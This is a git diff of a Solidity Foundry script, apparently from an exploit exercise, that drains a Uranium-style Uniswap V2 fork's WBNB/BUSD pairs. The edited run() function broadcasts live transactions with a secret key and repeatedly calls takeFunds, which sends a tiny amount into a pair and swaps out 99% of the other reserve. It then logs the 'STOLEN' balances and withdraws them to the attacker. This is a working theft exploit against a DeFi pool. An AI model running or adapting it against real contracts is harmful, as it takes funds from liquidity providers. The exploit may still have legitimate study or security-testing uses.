@@ -52,23 +52,48 @@ contract Exam1 is Test, Script {
     /// @dev
     /// forge script -f exam1 Exam1
     function run() public {
-        // vm.allowCheatcodes(attacker);
-        // vm.startBroadcast(secret);
-
-        console.log("Attacker: ", attacker);
+        vm.startBroadcast(secret);
+        console.log(attacker); // 10 ether
         console.log(attacker.balance); // 10 ether
+        IWrappedNative(wbnb).deposit{value: 1.0 ether}();
+        console.log("WBNB start : ", IERC20(wbnb).balanceOf(address(attacker)));
+        takeFunds(wbnb, busd, 0.0001 ether);
+        takeFunds(busd, wbnb, 0.0099 ether);
+        takeFunds(wbnb, busd, 0.0001 ether);
+        takeFunds(busd, wbnb, 0.0099 ether);
+        takeFunds(wbnb, busd, 0.0001 ether);
+        takeFunds(busd, wbnb, 0.0099 ether);
+        takeFunds(wbnb, busd, 0.0001 ether);
+        takeFunds(busd, wbnb, 0.0099 ether);
 
-        // console.log(wbnb.code.length);
+        console.log("BUSD STOLEN : ", IERC20(busd).balanceOf(msg.sender));
+        console.log("WBNB STOLEN : ", IERC20(wbnb).balanceOf(msg.sender));
+
+        IWrappedNative(wbnb).withdraw(IERC20(wbnb).balanceOf(msg.sender));
+
+        console.log((attacker.balance - 16206778886231361245843) / 1e18); // 10 ether
+        console.log((attacker.balance - 16206778886231361245843) % 1e18); // 10 ether
+
+        // address dest = address(0xa6050eE278beff5A1E496C465E1458762d770370);
+        // dest.call{value: 100 ether}("");
+        // console.log(dest.balance);
+        // testExploit();
+        // vm.allowCheatcodes(attacker);
+
+        // console.log("Attacker: ", attacker);
+        // console.log(attacker.balance); // 10 ether
+
+        // // console.log(wbnb.code.length);
         // console.log(busd.code.length);
-        console.log(attacker);
-        console.log(address(this));
-        address(this).call{value: attacker.balance}("");
-        console.log(address(this).balance); // 10 ether
-
-        // console.log(IERC20(wbnb).balanceOf(attacker));
         // console.log(IERC20(busd).balanceOf(attacker));
+        // console.log(attacker);
+        // console.log(address(this));
+        // console.log(address(this).balance); // 10 ether
 
-        testExploit();
+        // // console.log(IERC20(wbnb).balanceOf(attacker));
+        // // console.log(IERC20(busd).balanceOf(attacker));
+
+        // testExploit();
 
         // IUniswapV2Factory factory = IUniswapV2Factory(uraniumFactory);
         // console.log(attacker.balance); // 10 ether
@@ -96,35 +121,27 @@ contract Exam1 is Test, Script {
 
     function testExploit() public {
         wrap();
-        takeFunds(wbnb, busd, 10 ether);
-        takeFunds(busd, wbnb, 100 ether);
-        console.log("BUSD STOLEN : ", IERC20(busd).balanceOf(address(this)));
-        console.log("WBNB STOLEN : ", IERC20(wbnb).balanceOf(address(this)));
-        console.log(wbnb.balance); // 1
+        takeFunds(wbnb, busd, 9 ether);
+        takeFunds(busd, wbnb, 10 ether);
+        console.log("BUSD STOLEN : ", IERC20(busd).balanceOf(msg.sender));
+        console.log("WBNB STOLEN : ", IERC20(wbnb).balanceOf(msg.sender));
 
-        IWrappedNative(wbnb).withdraw(IERC20(wbnb).balanceOf(address(this)));
         // console.logBytes(wbnb.code);
-
-        attacker.call{value: 90 ether}("");
-        console.log(attacker.balance); // 1
     }
 
-    function wrap() internal {
-        IWrappedNative(wbnb).deposit{value: 10 ether}();
-        console.log("WBNB start : ", IERC20(wbnb).balanceOf(address(this)));
-    }
+    function wrap() internal {}
 
     function takeFunds(address token0, address token1, uint256 amount) internal {
         IUniswapV2Factory factory = IUniswapV2Factory(uraniumFactory);
         IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(token1), address(token0)));
-
+        // console.log(address(pair).code.length);
         IERC20(token0).transfer(address(pair), amount);
         uint256 amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;
 
         pair.swap(
             pair.token0() == address(token1) ? amountOut : 0,
             pair.token0() == address(token1) ? 0 : amountOut,
-            address(this),
+            msg.sender,
             new bytes(0)
         );
     }
